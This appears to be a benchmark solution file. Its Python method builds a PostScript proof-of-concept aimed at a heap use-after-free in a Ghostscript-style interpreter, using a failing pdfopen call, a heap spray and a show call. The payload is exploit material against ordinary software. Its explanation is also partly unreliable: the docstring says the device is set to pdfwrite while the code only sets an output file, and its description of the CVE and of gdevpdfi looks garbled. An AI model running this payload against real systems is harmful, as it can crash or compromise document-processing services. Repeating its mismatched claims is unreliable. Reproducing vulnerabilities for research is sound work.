class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Heap Use After Free
        vulnerability in a Postscript interpreter.

        The vulnerability, similar to CVE-2023-36664 in Ghostscript, arises in
        the PDF interpreter device (`gdevpdfi`). The trigger sequence is as follows:

        1.  The Postscript `setpagedevice` operator is used to set the output
            device to `pdfwrite`. This activates the vulnerable PDF backend for
            handling graphics and text operations.

        2.  The `pdfopen` operator is called with an invalid PDF source (in this
            case, a file object created from an empty string). This call is
            designed to fail. In the vulnerable version, the error handling path
            frees a stream object associated with the PDF interpreter context
            but fails to nullify the pointer to it, leaving a dangling pointer.
            The operation is wrapped in a `stopped` context to catch the
            expected error and allow the script to continue execution.

        3.  A heap spray is performed by allocating multiple strings. This step
            is intended to overwrite the memory region of the just-freed stream
            object with controlled data, making the subsequent crash more reliable.

        4.  Finally, the `show` operator is called to render text. This operation
            is processed by the `pdfwrite` device, which leads to a call chain
            that attempts to use the dangling stream pointer. Accessing this
            pointer, which now points to either invalid or controlled memory from
            the spray, results in a Use-After-Free, causing the program to crash.

        The resulting PoC is a compact Postscript file that executes these steps
        to reliably trigger the vulnerability.
        """
        
        poc_parts = [
            b"%!PS",
            # 1. Activate the vulnerable PDF interpreter device.
            b"<< /OutputFile (/dev/null) >> setpagedevice",
            # 2. Create an invalid PDF source and cause pdfopen to fail, freeing the stream.
            b"/DataSource () (r) file def",
            b"{ DataSource pdfopen } stopped pop",
            # 3. Spray the heap to overwrite the freed memory region for a reliable crash.
            b"30 { 200 string pop } repeat",
            # 4. Trigger the Use-After-Free by calling an operator that uses the dangling pointer.
            b"/Helvetica findfont 12 scalefont setfont",
            b"100 100 moveto",
            b"(UAF) show",
            b"showpage"
        ]
        
        return b" ".join(poc_parts)